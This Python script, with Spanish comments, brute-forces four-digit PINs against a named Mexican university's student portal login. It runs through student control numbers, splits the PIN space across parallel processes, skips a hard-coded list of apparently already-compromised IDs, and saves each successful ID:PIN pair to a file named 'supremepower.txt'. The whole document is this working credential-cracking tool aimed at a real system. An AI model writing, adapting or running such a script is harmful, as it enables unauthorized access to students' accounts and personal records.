import multiprocessing
import requests

control_numbers_array = [
    20140801,
    20140892,
    20140901,
    20140902,
    20140903,
    20140904,
    20140905,
    20140935,
    20140918,
    20140913,
    20140922,
    20140921,
    20140992,
    20140939,
    20140989,
    20140919,
    20140950,
    20140974,
    20140928,
    20140908,
    20140907,
    20140929,
    20140964,
    20140997,
    20140916,
    20140970,
    20140975,
    20140967,
    20140977,
    20140985,
    20140938,
    20140942,
    20140969,
    20140965,
    20140927,
    20140944,
    20140911,
    20141003,
    20140926,
    20140931,
    20140999,
    20140933,
    20140941,
    20140945,
    20140983,
    20140973,
    20140960,
    20141004,
    20140995,
    20140996,
    20140987,
    20140935
]

# URL de inicio de sesión y otros parámetros configurables
login_url = "https://sii.itq.edu.mx/sistema/index.php"
target_control_numbers = list(range(20140129, 20140130))
password_ranges = [(0000, 4499), (4500, 9999)]

def generate_numbers(ctrl_number, password_range, success_event):
    session = requests.Session()
    
    for number in range(*password_range):
        formatted_number = f'{number:04}'
        data = {
            "no_de_control": ctrl_number,  # Reemplaza con tu número de control
            "password": formatted_number,  # Reemplaza con tu contraseña
        }

        try:
            response = session.post(login_url, data=data)
            if "modulos/alu/" in response.text:
                print("Inicio de sesión exitoso!")
                print(f"{ctrl_number}:{formatted_number}")
                with open("supremepower.txt", "a") as f:
                    f.write(f"{ctrl_number}:{formatted_number}\n")
                success_event.set()
                break
        except requests.RequestException as e:
            print(f"Error en la solicitud: {e}")
        finally:
            session.close()

if __name__ == "__main__":
    success_events = [multiprocessing.Event() for _ in target_control_numbers]
    processes = []

    for ctrl_number, success_event in zip(target_control_numbers, success_events):
        if ctrl_number in control_numbers_array:
            print("Número de control omitido:", ctrl_number)
            continue

        for password_range in password_ranges:
            print(f"Iniciando proceso para rango {password_range} en {ctrl_number}")
            process = multiprocessing.Process(target=generate_numbers, args=(ctrl_number, password_range, success_event))
            processes.append(process)
            process.start()

    # Esperar a que algún proceso marque su evento de éxito
    for success_event in success_events:
        success_event.wait()

    # Terminar todos los demás procesos
    for process in processes:
        if process.is_alive():
            process.terminate()

    # Opcional: Unir los procesos terminados
    for process in processes:
        process.join()
